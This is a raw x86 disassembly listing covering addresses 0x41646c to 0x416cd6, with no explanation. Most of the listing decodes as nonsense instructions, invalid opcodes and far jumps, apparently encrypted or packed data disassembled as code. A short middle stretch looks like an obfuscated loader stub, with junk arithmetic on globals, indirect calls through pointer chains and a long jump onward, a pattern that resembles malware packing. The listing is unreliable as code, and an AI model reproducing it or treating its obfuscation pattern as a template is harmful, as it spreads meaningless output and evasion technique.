  41646c:	xor    ch,BYTE PTR [eax+ecx*2+0x4c]
  416470:	add    eax,0x5ff9a737
  416475:	mov    BYTE PTR [ebp+0x589dcd26],ch
  41647b:	mov    edi,0x8cbb128c
  416480:	js     0x4164a9
  416482:	push   ds
  416483:	mov    ch,0xad
  416485:	sahf   
  416486:	in     eax,dx
  416487:	push   ss
  416488:	cmp    eax,DWORD PTR ds:0x3d5878a1
  41648e:	cmp    DWORD PTR ds:[eax],ebp
  416491:	int    0x8c
  416493:	xor    eax,0xefc585d4
  416498:	js     0x416512
  41649a:	enter  0x3ebf,0xe6
  41649e:	sbb    BYTE PTR [esi+0x7],al
  4164a1:	(bad)  
  4164a2:	je     0x416489
  4164a4:	xor    esi,DWORD PTR ss:0xf96e66d3
  4164ab:	add    al,0xf
  4164ad:	xchg   DWORD PTR ds:[ecx-0x42],edi
  4164b1:	stos   BYTE PTR es:[edi],al
  4164b2:	jb     0x416477
  4164b4:	xchg   esp,eax
  4164b5:	push   es
  4164b6:	xchg   ebx,eax
  4164b7:	loope  0x41646a
  4164b9:	xchg   edi,eax
  4164ba:	loop   0x41648e
  4164bc:	sbb    bh,BYTE PTR ds:0x99e04d30
  4164c2:	imul   esp,DWORD PTR [bx+di+0xb50],0x49
  4164c8:	xor    esp,DWORD PTR [esi-0x78]
  4164cb:	and    ebp,DWORD PTR [edi+0x544c510c]
  4164d1:	xor    DWORD PTR [edx+0x4d],edx
  4164d4:	add    DWORD PTR [ebx+ebp*1-0x32],ebx
  4164d8:	out    dx,al
  4164d9:	inc    ebp
  4164da:	push   edi
  4164db:	pop    ebp
  4164dc:	mov    ebx,es
  4164de:	cdq    
  4164df:	lea    edi,[edx-0x1f]
  4164e2:	add    DWORD PTR [ebp-0x3ad8c842],ebx
  4164e8:	lds    ebx,FWORD PTR [esi-0x6d]
  4164eb:	mov    eax,ds:0x5123ec3e
  4164f0:	pop    edi
  4164f1:	ins    DWORD PTR es:[edi],dx
  4164f2:	sub    ebx,DWORD PTR [edi+edi*8]
  4164f5:	mov    ah,0x51
  4164f7:	push   edx
  4164f8:	add    ah,BYTE PTR [edi+0x41]
  4164fb:	add    eax,0x32d1f2ac
  416500:	pop    eax
  416501:	adc    ebp,DWORD PTR [ecx-0x1f]
  416504:	xchg   ebp,eax
  416505:	adc    esp,ecx
  416507:	add    dl,BYTE PTR [esi+0x73d828ce]
  41650d:	fdiv   st,st(2)
  41650f:	pop    ds
  416510:	clc    
  416511:	cmc    
  416512:	pop    esp
  416513:	hlt    
  416514:	adc    bl,ah
  416516:	add    ebp,0xbf3c872
  41651c:	mov    al,ds:0x6629421f
  416521:	push   ds
  416522:	jne    0x416516
  416524:	cs push edx
  416526:	jne    0x416540
  416528:	mov    ch,0xe0
  41652a:	lods   al,BYTE PTR ds:[esi]
  41652b:	lea    ebp,[esi]
  41652d:	add    eax,0x6adb0686
  416532:	mov    ds:0xadd19ee7,eax
  416537:	out    dx,al
  416538:	les    esi,FWORD PTR [eax]
  41653a:	push   edi
  41653b:	or     BYTE PTR [eax-0x2f5b1fa6],dl
  416541:	and    bl,cl
  416543:	iret   
  416544:	pop    ebx
  416545:	js     0x416590
  416547:	call   0x79521f2d
  41654c:	or     BYTE PTR [eax+0x7d],bl
  41654f:	mov    cl,0x90
  416551:	xchg   esp,eax
  416552:	out    dx,eax
  416553:	loope  0x416589
  416555:	xchg   DWORD PTR [esi+0x65],edi
  416558:	mov    ah,0xfa
  41655a:	cli    
  41655b:	jge    0x416550
  41655d:	mov    dh,0x66
  41655f:	add    DWORD PTR [ecx+0x19],ecx
  416562:	in     eax,0x12
  416564:	pushf  
  416565:	out    0x9a,al
  416567:	or     ebx,edx
  416569:	adc    eax,0x16a132d1
  41656e:	xchg   BYTE PTR [edx+edi*4+0x5],dl
  416572:	mov    ah,0x5d
  416574:	ret    
  416575:	pop    edi
  416576:	test   al,0xd5
  416578:	inc    edx
  416579:	mov    ah,BYTE PTR [ebp-0xd]
  41657c:	mov    edi,0xda0e68b8
  416581:	jbe    0x41651e
  416583:	jbe    0x41656f
  416585:	xor    eax,0x36da0455
  41658a:	mov    eax,ds:0xa45c43b1
  41658f:	push   0x26e9eb1b
  416594:	sbb    ebx,DWORD PTR cs:[ebx+ecx*1-0x1ed97da0]
  41659c:	lock rcr BYTE PTR [esi-0x6526bb12],cl
  4165a3:	or     cl,BYTE PTR [ebp-0x117cde17]
  4165a9:	lods   al,BYTE PTR ds:[esi]
  4165aa:	das    
  4165ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165ac:	pop    ss
  4165ad:	fld    QWORD PTR [ebp-0x532a43a5]
  4165b3:	xchg   ebx,eax
  4165b4:	dec    edi
  4165b5:	add    DWORD PTR [ebp-0x7322fb9b],esp
  4165bb:	xchg   DWORD PTR [ebp+0x72aaecd7],edx
  4165c1:	mov    ecx,0x43d2a359
  4165c6:	dec    edx
  4165c7:	scas   al,BYTE PTR es:[edi]
  4165c8:	in     al,dx
  4165c9:	mov    WORD PTR [edi],cs
  4165cb:	cs lahf 
  4165cd:	jnp    0x4165f8
  4165cf:	(bad)  
  4165d0:	(bad)  
  4165d1:	in     al,0x8d
  4165d3:	das    
  4165d4:	jmp    0xefc94ca5
  4165d9:	xchg   ecx,eax
  4165da:	inc    edx
  4165db:	mov    WORD PTR [esi+esi*4],ss
  4165de:	lods   al,BYTE PTR ds:[esi]
  4165df:	jmp    0x4165d6
  4165e1:	mov    ds:0xffde8895,al
  4165e6:	sbb    bh,BYTE PTR [ebx+0x6496d90b]
  4165ec:	cmp    al,0xe3
  4165ee:	cmc    
  4165ef:	sub    esp,ebp
  4165f1:	jle    0x4165b5
  4165f3:	mov    ah,0x82
  4165f5:	rol    esp,1
  4165f7:	lods   eax,DWORD PTR ds:[esi]
  4165f8:	(bad)  
  4165f9:	jmp    0x416663
  4165fb:	popa   
  4165fc:	outs   dx,BYTE PTR ds:[esi]
  4165fd:	push   esp
  4165fe:	fsub   QWORD PTR [edi+0x5da028e9]
  416604:	imul   esi,DWORD PTR [edx+eax*2],0x36ade264
  41660b:	mov    ebx,0x9d113da4
  416610:	cmp    esp,DWORD PTR [ebp-0x54]
  416613:	and    al,0x61
  416615:	ret    0x1861
  416618:	test   al,0x5
  41661a:	and    eax,0x5dbb7e1e
  41661f:	sahf   
  416620:	push   0x58
  416622:	sub    ch,al
  416624:	xchg   esp,eax
  416625:	jg     0x416615
  416627:	gs (bad) 
  416629:	cs mov dl,0x63
  41662c:	inc    esi
  41662d:	sbb    DWORD PTR ds:[ebp-0x4c00d668],edx
  416634:	sbb    eax,0xd96e0a8
  416639:	retf   0x7dea
  41663c:	add    DWORD PTR [esi+eiz*1],esp
  41663f:	xor    BYTE PTR cs:[edx+ebx*1+0x2da80e0],cl
  416647:	mov    BYTE PTR [esi+0x54],bh
  41664a:	lahf   
  41664b:	push   edx
  41664c:	ins    BYTE PTR es:[edi],dx
  41664d:	cdq    
  41664e:	sbb    BYTE PTR [edx-0x371b053c],al
  416654:	es pop edi
  416656:	fld    QWORD PTR [esp+0x68]
  41665a:	inc    edi
  41665b:	jmp    0x41662d
  41665d:	(bad)  
  41665e:	sub    BYTE PTR [edi-0x40365359],0xa3
  416665:	cmp    al,BYTE PTR [esp+eiz*8]
  416668:	mov    dl,BYTE PTR [esi-0x4d]
  41666b:	mov    BYTE PTR [ebx-0x44],ch
  41666e:	xchg   edx,eax
  41666f:	lahf   
  416670:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416671:	mov    cl,0x41
  416673:	add    eax,0x477005d7
  416678:	mov    WORD PTR [eax+0x61],dx
  41667c:	mov    ds:0x79c4ba58,al
  416681:	push   0xe4c6db5c
  416686:	ds pop edi
  416688:	ins    BYTE PTR es:[edi],dx
  416689:	out    0x72,al
  41668b:	jl     0x41660f
  41668d:	icebp  
  41668e:	adc    esi,DWORD PTR [ebp+0x1f]
  416691:	push   ebp
  416692:	call   0x2b0b:0x4fe551f3
  416699:	inc    esi
  41669a:	dec    ebp
  41669b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41669c:	ficomp DWORD PTR [edx+0x70]
  41669f:	rol    BYTE PTR [esi+0x4be036d3],cl
  4166a5:	xor    edx,0x28301e09
  4166ab:	mov    bh,0xac
  4166ad:	aas    
  4166ae:	cwde   
  4166af:	cmp    edi,esp
  4166b1:	js     0x41671b
  4166b3:	mov    esi,0x3c3172d6
  4166b8:	ins    DWORD PTR es:[edi],dx
  4166b9:	push   edx
  4166ba:	sbb    al,0xc5
  4166bc:	popa   
  4166bd:	cmp    ah,BYTE PTR [edi]
  4166bf:	pop    edx
  4166c0:	sub    DWORD PTR [eax+edi*2],esi
  4166c3:	inc    esp
  4166c4:	and    eax,0x634825d6
  4166c9:	outs   dx,DWORD PTR ds:[esi]
  4166ca:	(bad)  
  4166cc:	push   esi
  4166cd:	jno    0x416676
  4166cf:	test   ebx,edx
  4166d1:	ret    0x7c61
  4166d4:	xor    al,0x66
  4166d6:	out    0x48,eax
  4166d8:	retf   
  4166d9:	mov    esi,0x18211c5a
  4166de:	imul   edx,DWORD PTR [edx+0x7c22749a],0xffffff92
  4166e5:	xor    ebx,DWORD PTR [edx]
  4166e7:	xchg   edx,eax
  4166e8:	dec    esi
  4166e9:	lods   eax,DWORD PTR ds:[esi]
  4166ea:	hlt    
  4166eb:	jnp    0x41668f
  4166ed:	mov    DWORD PTR [ebx],ebx
  4166ef:	sbb    al,0xf
  4166f1:	inc    edi
  4166f2:	jmp    0x19c6:0x5b3f765
  4166f9:	mov    ds,edi
  4166fb:	out    dx,eax
  4166fc:	cs push ecx
  4166fe:	jl     0x4166f9
  416700:	cmp    eax,0x53a7203b
  416705:	stc    
  416706:	aaa    
  416707:	cld    
  416708:	into   
  416709:	and    al,0xb6
  41670b:	jmp    0x1a1:0xa09645f7
  416712:	push   es
  416713:	xor    BYTE PTR [eax],bh
  416715:	js     0x4166fa
  416717:	cwde   
  416718:	sbb    BYTE PTR [esi+0x2],al
  41671b:	out    0xfa,al
  41671d:	push   eax
  41671e:	pop    esi
  41671f:	inc    edi
  416720:	in     eax,dx
  416721:	pop    eax
  416722:	aam    0xd7
  416724:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416725:	test   bl,bh
  416727:	inc    ebp
  416728:	pop    ebx
  416729:	push   esi
  41672a:	sahf   
  41672b:	and    DWORD PTR [edi],eax
  41672d:	cmp    al,BYTE PTR [ebp+0x634a455f]
  416733:	sbb    al,0x1c
  416735:	adc    BYTE PTR [ebp-0x20c29878],dl
  41673b:	dec    edi
  41673c:	xchg   ebp,eax
  41673d:	outs   dx,DWORD PTR ds:[esi]
  41673e:	rcl    DWORD PTR [eax+esi*4],0x7e
  416742:	push   ebp
  416743:	and    eax,0xa18c316
  416748:	stos   DWORD PTR es:[edi],eax
  416749:	repz sub esp,ecx
  41674c:	jno    0x41673a
  41674e:	xchg   ebp,eax
  41674f:	sub    DWORD PTR [eax+0xc7a833a],edx
  416755:	xchg   edi,eax
  416756:	sub    DWORD PTR [ebx+0x2107d295],esi
  41675c:	js     0x416766
  41675e:	add    bh,BYTE PTR [ebp-0x300420be]
  416764:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416765:	jg     0x416705
  416767:	or     ebx,DWORD PTR [esp+ebx*8-0x7e]
  41676b:	xchg   ebp,eax
  41676c:	(bad)  
  41676d:	outs   dx,BYTE PTR ds:[esi]
  41676e:	data16 xchg BYTE PTR [ebx],bl
  416771:	jg     0x4167a0
  416773:	xor    eax,0xdb95e685
  416778:	adc    BYTE PTR [ecx],al
  41677a:	xor    BYTE PTR [ecx+0x4f4fd60],dh
  416780:	push   edx
  416781:	out    0x89,al
  416783:	fs push 0x4c
  416786:	or     dl,ah
  416788:	repnz lods eax,DWORD PTR ds:[esi]
  41678a:	outs   dx,BYTE PTR ds:[esi]
  41678b:	add    edi,DWORD PTR [eax+eiz*8+0x5e]
  41678f:	pop    ss
  416790:	fstp   TBYTE PTR [di-0x1cc]
  416795:	xor    BYTE PTR [edx+0x51d83e34],dl
  41679b:	ror    ebx,cl
  41679d:	add    DWORD PTR [esi],0x6330102
  4167a3:	mov    ds:0x93ab4063,al
  4167a8:	cdq    
  4167a9:	dec    edi
  4167aa:	sti    
  4167ab:	add    BYTE PTR [edi-0x274f944a],0xc
  4167b2:	inc    eax
  4167b3:	cdq    
  4167b4:	(bad)  
  4167b5:	pop    edi
  4167b6:	jbe    0x4167b9
  4167b8:	cmp    eax,0x7abdd726
  4167bd:	inc    ebx
  4167be:	rcr    DWORD PTR [edi],0x89
  4167c1:	sub    al,0xfb
  4167c3:	ins    BYTE PTR es:[edi],dx
  4167c4:	pop    ecx
  4167c5:	sub    DWORD PTR [edx-0x6f],ebp
  4167c8:	call   0x102b239f
  4167cd:	inc    edi
  4167ce:	sbb    eax,0x65100863
  4167d3:	je     0x4167ad
  4167d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167d6:	nop
  4167d7:	jne    0x41675b
  4167d9:	inc    edi
  4167da:	popa   
  4167db:	in     eax,0xcb
  4167dd:	in     eax,0xfb
  4167df:	push   edx
  4167e0:	cdq    
  4167e1:	int3   
  4167e2:	jno    0x416860
  4167e4:	shl    DWORD PTR [eax-0x6],0x23
  4167e8:	jb     0x4167a5
  4167ea:	bound  ebx,QWORD PTR [eax-0x34e66cdb]
  4167f0:	in     al,dx
  4167f1:	pop    ss
  4167f2:	lds    ecx,FWORD PTR [edx]
  4167f4:	or     DWORD PTR [edi-0x1028e663],ebp
  4167fa:	popf   
  4167fb:	lahf   
  4167fc:	std    
  4167fd:	ja     0x416863
  4167ff:	sbb    al,0xbb
  416801:	xor    ecx,DWORD PTR [edi]
  416803:	jp     0x41682c
  416805:	es push ebp
  416807:	sahf   
  416808:	addr16 hlt 
  41680a:	jp     0x416819
  41680c:	arpl   WORD PTR [edx],cx
  41680e:	scas   al,BYTE PTR es:[edi]
  41680f:	je     0x41686d
  416811:	fistp  WORD PTR [edx+0x71]
  416814:	xor    BYTE PTR [edi-0x34],dl
  416817:	aad    0x4c
  416819:	mov    ecx,0x69c6fc26
  41681e:	adc    dl,dh
  416820:	xchg   esp,eax
  416821:	jne    0x4167b8
  416823:	push   cs
  416824:	fs fwait
  416826:	or     al,0xb2
  416828:	loop   0x41686b
  41682a:	or     BYTE PTR [eax+esi*4+0x4c],ch
  41682e:	ins    DWORD PTR es:[edi],dx
  41682f:	pusha  
  416830:	inc    ecx
  416831:	fwait
  416832:	ror    esp,0xed
  416835:	(bad)  
  416836:	jbe    0x4167f5
  416838:	rep stos DWORD PTR es:[edi],eax
  41683a:	adc    ah,BYTE PTR [ebp+0xd]
  41683d:	add    DWORD PTR [ecx],edi
  41683f:	mov    esp,0xd0bdf4c7
  416844:	mov    ds:0x1a8dd714,al
  416849:	gs call 0x8a33b218
  41684f:	(bad)  
  416850:	jbe    0x416872
  416852:	int3   
  416853:	lods   al,BYTE PTR ds:[esi]
  416854:	stos   DWORD PTR es:[edi],eax
  416855:	into   
  416856:	push   esi
  416857:	sub    dh,BYTE PTR [eax-0x6d]
  41685a:	les    edx,FWORD PTR [edx+0x34]
  41685d:	sbb    eax,0x460a2c15
  416862:	jmp    0x416834
  416864:	stos   DWORD PTR es:[edi],eax
  416865:	push   0x39acc6b7
  41686a:	sbb    BYTE PTR [esi+0x7f],dl
  41686d:	mov    ah,BYTE PTR [edi+0x5ef70d41]
  416873:	and    bh,BYTE PTR [ebx-0x38]
  416876:	pop    eax
  416877:	jo     0x41683a
  416879:	test   al,0xfe
  41687b:	mov    ebp,0x776a351e
  416880:	sbb    BYTE PTR [eax+0x12],dh
  416883:	icebp  
  416884:	sar    BYTE PTR ds:0x9f640097,0xaf
  41688b:	and    BYTE PTR [edi+0x36],dh
  41688e:	sub    esp,DWORD PTR [esi]
  416890:	xor    eax,0xcf410249
  416895:	push   ss
  416896:	and    ebp,DWORD PTR [ebp+0x23]
  416899:	pop    eax
  41689a:	rcl    BYTE PTR [ebx-0x38],cl
  41689d:	mov    BYTE PTR [esi+0x5d241e14],ch
  4168a3:	mov    ah,0x94
  4168a5:	push   eax
  4168a6:	test   DWORD PTR [esi],ebp
  4168a8:	or     eax,DWORD PTR [ebp+edi*1-0x8]
  4168ac:	mov    eax,0xdb102d0b
  4168b1:	hlt    
  4168b2:	popf   
  4168b3:	retf   
  4168b4:	fsub   DWORD PTR [esi-0x53]
  4168b7:	cmp    bl,ah
  4168b9:	mov    ah,0x7f
  4168bb:	fist   DWORD PTR [ecx-0x5a857b11]
  4168c1:	pop    eax
  4168c2:	pop    esi
  4168c3:	cs mov cl,0x56
  4168c6:	dec    ecx
  4168c7:	test   al,al
  4168c9:	xchg   DWORD PTR [esi+0x9],ecx
  4168cc:	cld    
  4168cd:	inc    ecx
  4168ce:	inc    ebx
  4168cf:	sbb    eax,0x267ecd64
  4168d4:	rcl    DWORD PTR [edx],1
  4168d6:	sub    dh,dh
  4168d8:	iret   
  4168d9:	sbb    DWORD PTR [eax+0x765af99b],ebx
  4168df:	or     eax,DWORD PTR [eax]
  4168e1:	lahf   
  4168e2:	aam    0x77
  4168e4:	es push ds
  4168e6:	aam    0x72
  4168e8:	fsubr  QWORD PTR [ebx+edi*4-0x5f6cd2a9]
  4168ef:	push   0xb72eef33
  4168f4:	jb     0x41695c
  4168f6:	pop    ebp
  4168f7:	cmc    
  4168f8:	js     0x416964
  4168fa:	dec    esi
  4168fb:	mov    ebp,0x1c8a367c
  416900:	cmp    esp,esi
  416902:	out    dx,al
  416903:	dec    ebp
  416904:	aad    0x54
  416906:	fs aad 0x30
  416909:	dec    edx
  41690a:	cmp    DWORD PTR [esi],0x2cc4183d
  416910:	stc    
  416911:	neg    ch
  416913:	pusha  
  416914:	gs retf 0x2da
  416918:	push   0x25
  41691a:	mov    al,ds:0x6a453f42
  41691f:	loopne 0x4168bb
  416921:	iret   
  416922:	outs   dx,BYTE PTR ss:[esi]
  416924:	xchg   DWORD PTR [eax],edx
  416926:	adc    ebx,DWORD PTR [esi+eiz*8+0x7438fc30]
  41692d:	xor    ecx,ecx
  41692f:	outs   dx,BYTE PTR ds:[esi]
  416930:	inc    esi
  416931:	shr    eax,cl
  416933:	cmc    
  416934:	mov    ecx,0x13f26dea
  416939:	(bad)  
  41693a:	pushf  
  41693b:	stc    
  41693c:	in     eax,dx
  41693d:	mov    ch,0x49
  41693f:	fdivrp st(2),st
  416941:	pop    ss
  416942:	xor    ecx,DWORD PTR [edi+0x5f9b016f]
  416948:	push   eax
  416949:	dec    ecx
  41694a:	xchg   ecx,eax
  41694b:	jbe    0x4168d7
  41694d:	ds push esp
  41694f:	push   eax
  416950:	and    ebx,edx
  416952:	push   cs
  416953:	jns    0x41691d
  416955:	nop
  416956:	mov    esi,0xc905f68c
  41695b:	data16 ja 0x416981
  41695e:	mov    ebp,DWORD PTR [ecx-0x7a]
  416961:	sbb    edx,ecx
  416963:	stos   DWORD PTR es:[edi],eax
  416964:	xor    bl,BYTE PTR [edx-0x68eba20a]
  41696a:	pushf  
  41696b:	cld    
  41696c:	push   eax
  41696d:	and    eax,esi
  41696f:	fwait
  416970:	jb     0x416901
  416972:	adc    DWORD PTR [esi+0x31ef92db],ebx
  416978:	and    ecx,ecx
  41697a:	mov    ss,WORD PTR ds:0x3478d757
  416981:	jns    0x416930
  416983:	enter  0xaf4e,0xaa
  416987:	out    0x50,eax
  416989:	jp     0x416950
  41698b:	xor    al,0x6d
  41698d:	lods   al,BYTE PTR ds:[esi]
  41698e:	xchg   ebp,eax
  41698f:	rcl    DWORD PTR [ebx+0xffe7d13],cl
  416995:	sbb    edi,DWORD PTR [ebp-0x1b]
  416998:	repnz shl DWORD PTR [edi],cl
  41699b:	and    al,0x8
  41699d:	out    0xfe,al
  41699f:	call   0xcb8414c9
  4169a4:	test   eax,0x6a839143
  4169a9:	retf   0xfe23
  4169ac:	jge    0x416954
  4169ae:	repnz inc ebp
  4169b0:	xor    ecx,DWORD PTR [edi]
  4169b2:	inc    ebp
  4169b3:	fsub   DWORD PTR [esi]
  4169b5:	add    eax,0xb913ac47
  4169ba:	or     ebp,esp
  4169bc:	sar    eax,0xe5
  4169bf:	and    DWORD PTR [edi+edi*8-0x65eb071a],edx
  4169c6:	mov    es,WORD PTR [esi-0x72]
  4169c9:	(bad)  [ecx]
  4169cb:	sbb    ecx,DWORD PTR [eax+0x36796044]
  4169d1:	add    eax,0x5dd1773a
  4169d6:	or     BYTE PTR [ebx+ebp*2],ch
  4169d9:	mov    al,ss:0xf8d213cb
  4169df:	cmp    BYTE PTR [edi+0x246369bb],al
  4169e5:	cld    
  4169e6:	js     0x4169bb
  4169e8:	sub    ah,bl
  4169ea:	adc    ebx,DWORD PTR [ecx-0x13deadca]
  4169f0:	fsubp  st(4),st
  4169f2:	mov    al,0x26
  4169f4:	(bad)  
  4169f5:	ja     0x4169de
  4169f7:	jecxz  0x416a2a
  4169f9:	push   eax
  4169fa:	mov    dl,ch
  4169fc:	mov    edi,eax
  4169fe:	rcl    DWORD PTR [edx+0x70],0x63
  416a02:	shr    cl,0xc3
  416a05:	xchg   ecx,eax
  416a06:	xchg   ebx,eax
  416a07:	inc    ebx
  416a08:	adc    bl,BYTE PTR [edi-0x77646f91]
  416a0e:	adc    BYTE PTR [edi+eiz*1-0x41],0x24
  416a13:	mov    al,ds:0x99be8bd6
  416a18:	popa   
  416a19:	cli    
  416a1a:	outs   dx,DWORD PTR ds:[esi]
  416a1b:	inc    esp
  416a1c:	dec    ecx
  416a1d:	(bad)  
  416a1e:	call   0x2cca:0x871ee9f8
  416a25:	xchg   esi,eax
  416a26:	dec    DWORD PTR [edi-0x65]
  416a29:	or     BYTE PTR [edx+eax*4],ah
  416a2c:	pop    ebx
  416a2d:	inc    esp
  416a2e:	jae    0x416a7f
  416a30:	jne    0x4169e1
  416a32:	or     eax,0xaf5bc387
  416a37:	pusha  
  416a38:	je     0x416a47
  416a3a:	lods   al,BYTE PTR ds:[esi]
  416a3b:	jp     0x4169d0
  416a3d:	fld    QWORD PTR [edi+0x728f81ce]
  416a43:	jle    0x416a72
  416a45:	pushf  
  416a46:	addr16 in al,dx
  416a48:	xlat   BYTE PTR ds:[ebx]
  416a49:	jb     0x416a68
  416a4b:	sub    esp,esp
  416a4d:	in     al,0x1c
  416a4f:	loop   0x416acb
  416a51:	out    0x8c,eax
  416a53:	push   ebp
  416a54:	adc    eax,0xf50d2bf9
  416a59:	mov    al,0xfb
  416a5b:	mov    cl,0xc7
  416a5d:	push   ds
  416a5e:	fistp  WORD PTR [ecx-0x8]
  416a61:	loopne 0x416a50
  416a63:	ret    
  416a64:	adc    edi,eax
  416a66:	adc    ebp,DWORD PTR [edx+0x72]
  416a69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a6a:	addr16 mov ds:0xaed0,al
  416a6e:	cs mov ah,0xff
  416a71:	mov    dl,0x38
  416a73:	cmp    eax,0x490429cd
  416a78:	mov    edx,0xb5a0bc8f
  416a7d:	(bad)
  416a80:	test   al,0x86
  416a82:	jl     0x416a50
  416a84:	shl    BYTE PTR [eax-0x62],cl
  416a87:	jg     0x416a4d
  416a89:	add    ebp,DWORD PTR [eax-0x5445ebfe]
  416a8f:	pop    edx
  416a90:	push   ds
  416a91:	cli    
  416a92:	add    al,0xe9
  416a94:	xchg   esp,eax
  416a95:	call   0x75ff:0x9403cea7
  416a9c:	loopne 0x416a29
  416a9e:	inc    ebp
  416a9f:	clc    
  416aa0:	mov    eax,DWORD PTR [eax]
  416aa2:	mov    eax,DWORD PTR [eax]
  416aa4:	mov    eax,DWORD PTR [eax]
  416aa6:	call   eax
  416aa8:	mov    eax,DWORD PTR [ebp-0x34]
  416aab:	mov    ecx,DWORD PTR ds:0x423ffb
  416ab1:	add    DWORD PTR [eax],ecx
  416ab3:	pop    edi
  416ab4:	pop    esi
  416ab5:	leave  
  416ab6:	ret    
  416ab7:	push   ebp
  416ab8:	mov    ebp,esp
  416aba:	sub    esp,0x18
  416abd:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  416ac4:	lea    eax,[ebp+0x14]
  416ac7:	mov    edx,DWORD PTR ds:0x42c00c
  416acd:	sub    DWORD PTR ds:0x42c01c,edx
  416ad3:	mov    DWORD PTR [ebp-0x4],eax
  416ad6:	and    DWORD PTR ds:0x42c01c,ebx
  416adc:	push   esi
  416add:	sub    ecx,esi
  416adf:	mov    esi,0xf89c85b6
  416ae4:	sub    ecx,ecx
  416ae6:	mov    DWORD PTR [ebp-0xc],esi
  416ae9:	or     DWORD PTR ds:0x42b000,0x59c6
  416af3:	lea    eax,[ebp-0xc]
  416af6:	sub    DWORD PTR ds:0x42b014,0x4110
  416b00:	mov    DWORD PTR [ebp-0x14],eax
  416b03:	add    ecx,ecx
  416b05:	mov    eax,DWORD PTR [ebp-0xc]
  416b08:	mov    edx,DWORD PTR [ebp-0x14]
  416b0b:	adc    DWORD PTR ds:0x429014,0x59c
  416b15:	mov    ecx,0x7510893
  416b1a:	xor    eax,ecx
  416b1c:	sub    DWORD PTR ds:0x42b014,0x42b004
  416b26:	add    eax,0x3272db
  416b2b:	mov    DWORD PTR [edx],eax
  416b2d:	mov    edx,DWORD PTR ds:0x42a004
  416b33:	add    DWORD PTR ds:0x429000,edx
  416b39:	mov    eax,ds:0x423df7
  416b3e:	mov    edx,DWORD PTR ds:0x42901c
  416b44:	add    DWORD PTR ds:0x429000,edx
  416b4a:	mov    edx,DWORD PTR [ebp-0x4]
  416b4d:	sub    DWORD PTR ds:0x42d000,0x780c
  416b57:	mov    eax,DWORD PTR [eax]
  416b59:	add    eax,DWORD PTR [edx]
  416b5b:	add    DWORD PTR ds:0x42900c,ecx
  416b61:	push   edi
  416b62:	and    DWORD PTR ds:0x429020,0x0
  416b6c:	mov    edx,DWORD PTR ds:0x429020
  416b72:	inc    edx
  416b73:	mov    DWORD PTR ds:0x429020,edx
  416b79:	cmp    DWORD PTR ds:0x429020,0x25
  416b80:	jne    0x416b8f
  416b86:	push   DWORD PTR [ebp-0x20]
  416b89:	call   DWORD PTR ds:0x425028
  416b8f:	cmp    DWORD PTR ds:0x429020,0x19
  416b96:	jb     0x416b6c
  416b9c:	add    DWORD PTR ds:0x42c01c,0x73bd
  416ba6:	mov    DWORD PTR [ebp-0x8],eax
  416ba9:	adc    DWORD PTR ds:0x42d00c,ecx
  416baf:	mov    edi,DWORD PTR [ebp+0x8]
  416bb2:	sbb    DWORD PTR ds:0x42d018,0x1580
  416bbc:	mov    eax,ds:0x423f7f
  416bc1:	and    DWORD PTR ds:0x42b01c,0x0
  416bcb:	jmp    0x416bdd
  416bd0:	mov    edx,DWORD PTR ds:0x42b01c
  416bd6:	inc    edx
  416bd7:	mov    DWORD PTR ds:0x42b01c,edx
  416bdd:	cmp    DWORD PTR ds:0x42b01c,0x1a
  416be4:	jae    0x416c47
  416bea:	cmp    DWORD PTR ds:0x42b01c,0x10
  416bf1:	jne    0x416c1c
  416bf7:	push   0x2d19
  416bfc:	push   DWORD PTR [ebp-0x10]
  416bff:	push   0x42d014
  416c04:	push   0x14d6
  416c09:	push   0x3bac
  416c0e:	push   0x6779
  416c13:	push   DWORD PTR [ebp-0xc]
  416c16:	call   DWORD PTR ds:0x42502c
  416c1c:	cmp    DWORD PTR ds:0x42b01c,0xf
  416c23:	jne    0x416c38
  416c29:	xor    edx,edx
  416c2b:	add    edx,DWORD PTR ds:0x42b01c
  416c31:	inc    edx
  416c32:	mov    DWORD PTR ds:0x42b01c,edx
  416c38:	jmp    0x416bd0
  416c3d:	adc    DWORD PTR ds:0x429028,0x58d4
  416c47:	mov    eax,DWORD PTR [eax+0x198]
  416c4d:	mov    edx,DWORD PTR ds:0x424302
  416c53:	mov    edx,DWORD PTR [edx]
  416c55:	add    DWORD PTR ds:0x42d008,edx
  416c5b:	xor    edi,ecx
  416c5d:	or     edx,0x793e
  416c63:	jmp    0x41901b
  416c68:	paddsw mm6,QWORD PTR es:[eax+0x63a36ce3]
  416c70:	mov    eax,0x9fe19036
  416c75:	(bad)  
  416c77:	nop
  416c78:	jp     0x416c9e
  416c7a:	popa   
  416c7b:	(bad)  
  416c7c:	(bad)  
  416c7d:	pop    edi
  416c7e:	bound  esp,QWORD PTR [edx+0x1f]
  416c81:	lahf   
  416c82:	sbb    BYTE PTR ds:[ecx+ebx*8+0x7e],dl
  416c87:	lea    esp,[edx]
  416c89:	or     eax,0x1a0973a
  416c8e:	mov    esi,0xa2c42c6b
  416c93:	(bad)  
  416c94:	xchg   edi,eax
  416c95:	iret   
  416c96:	aas    
  416c97:	dec    edi
  416c98:	xchg   edi,eax
  416c99:	icebp  
  416c9a:	jp     0x416ca2
  416c9c:	jb     0x416d0a
  416c9e:	mov    ch,0x4
  416ca0:	jne    0x416d1f
  416ca2:	push   edx
  416ca3:	clc    
  416ca4:	or     esi,DWORD PTR [eax+0xf0a9f9e]
  416caa:	(bad)  [esi+0x41a197ef]
  416cb0:	lds    edx,FWORD PTR [ebx-0x24]
  416cb3:	dec    esp
  416cb4:	push   edx
  416cb5:	out    dx,eax
  416cb6:	sti    
  416cb7:	inc    ebp
  416cb8:	repz jecxz 0x416cba
  416cbb:	push   ebx
  416cbc:	scas   eax,DWORD PTR es:[edi]
  416cbd:	sbb    ah,dl
  416cbf:	mov    esp,0xe5cafa38
  416cc4:	div    ebp
  416cc6:	imul   ebp,ebp,0x53b17c49
  416ccc:	not    BYTE PTR [edi]
  416cce:	sbb    esp,DWORD PTR [eax-0x6a0c1f34]
  416cd4:	jge    0x416cb0
  416cd6:	and    dh,BYTE PTR [ebx]
